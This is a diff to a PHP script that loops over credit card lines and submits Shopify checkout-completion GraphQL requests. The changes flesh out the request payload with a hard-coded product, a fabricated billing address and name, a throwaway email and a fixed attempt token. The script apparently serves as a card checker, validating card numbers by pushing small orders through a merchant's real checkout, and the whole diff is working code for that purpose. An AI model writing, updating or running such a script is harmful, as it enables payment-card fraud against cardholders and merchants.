@@ -490,7 +490,7 @@ foreach ($cc_lines as $cc_line) {
             'x-checkout-web-source-id: ' . $checkoutToken,
         ]);
 
-        $postf = json_encode([
+       $postf = json_encode([
     'query' => 'mutation SubmitForCompletion($input: NegotiationInput!, $attemptToken: String!) {
         submitForCompletion(input: $input, attemptToken: $attemptToken) {
             ...on SubmitSuccess {
@@ -573,23 +573,51 @@ foreach ($cc_lines as $cc_line) {
                                 'amount' => '5.99',
                                 'currencyCode' => 'USD'
                             ]
-                        ]
+                        ],
+                        'destinationChanged' => false
                     ]
-                ]
+                ],
+                'noDeliveryRequired' => [],
+                'useProgressiveRates' => false,
+                'prefetchShippingRatesStrategy' => null,
+                'supportsSplitShipping' => true
             ],
             'merchandise' => [
                 'merchandiseLines' => [
                     [
                         'stableId' => $stable_id,
+                        'merchandise' => [
+                            'productVariantReference' => [
+                                'id' => 'gid://shopify/ProductVariantMerchandise/42721297924198',
+                                'variantId' => 'gid://shopify/ProductVariant/42721297924198',
+                                'properties' => [],
+                                'sellingPlanId' => null,
+                                'sellingPlanDigest' => null
+                            ]
+                        ],
                         'quantity' => [
                             'items' => [
                                 'value' => 1
                             ]
-                        ]
+                        ],
+                        'expectedTotalPrice' => [
+                            'value' => [
+                                'amount' => '7.99',
+                                'currencyCode' => 'USD'
+                            ]
+                        ],
+                        'lineComponentsSource' => null,
+                        'lineComponents' => []
                     ]
                 ]
             ],
+            'memberships' => [
+                'memberships' => []
+            ],
             'payment' => [
+                'totalAmount' => [
+                    'any' => true
+                ],
                 'paymentLines' => [
                     [
                         'paymentMethod' => [
@@ -617,14 +645,75 @@ foreach ($cc_lines as $cc_line) {
                             ]
                         ]
                     ]
+                ],
+                'billingAddress' => [
+                    'streetAddress' => [
+                        'address1' => '4th Street Venue',
+                        'city' => 'New york',
+                        'countryCode' => 'US',
+                        'postalCode' => '10080',
+                        'firstName' => 'yashi Kumbi',
+                        'lastName' => 'Hasi',
+                        'zoneCode' => 'NY',
+                        'phone' => ''
+                    ]
                 ]
             ],
             'buyerIdentity' => [
+                'customer' => [
+                    'presentmentCurrency' => 'USD',
+                    'countryCode' => 'US'
+                ],
                 'email' => 'proxybroproxy@gmail.com',
-                'marketingConsent' => []
-            ]
+                'emailChanged' => false,
+                'phoneCountryCode' => 'US',
+                'marketingConsent' => [],
+                'shopPayOptInPhone' => [
+                    'countryCode' => 'US'
+                ],
+                'rememberMe' => false
+            ],
+            'tip' => [
+                'tipLines' => []
+            ],
+            'taxes' => [
+                'proposedAllocations' => null,
+                'proposedTotalAmount' => [
+                    'value' => [
+                        'amount' => '0',
+                        'currencyCode' => 'USD'
+                    ]
+                ],
+                'proposedTotalIncludedAmount' => null,
+                'proposedMixedStateTotalAmount' => null,
+                'proposedExemptions' => []
+            ],
+            'note' => [
+                'message' => null,
+                'customAttributes' => []
+            ],
+            'localizationExtension' => [
+                'fields' => []
+            ],
+            'nonNegotiableTerms' => null,
+            'scriptFingerprint' => [
+                'signature' => null,
+                'signatureUuid' => null,
+                'lineItemScriptChanges' => [],
+                'paymentScriptChanges' => [],
+                'shippingScriptChanges' => []
+            ],
+            'optionalDuties' => [
+                'buyerRefusesDuties' => false
+            ],
+            'cartMetafields' => []
         ],
-        'attemptToken' => $checkoutToken . '8ix3lway4kj'
+        'attemptToken' => $checkoutToken . '8ix3lway4kj',
+        'metafields' => [],
+        'analytics' => [
+            'requestUrl' => $urlbase.'/checkouts/cn/'.$checkoutToken,
+            'pageId' => 'b2b0b81e-D05D-47C0-F64C-18D9467EA842'
+        ]
     ],
     'operationName' => 'SubmitForCompletion'
 ]);
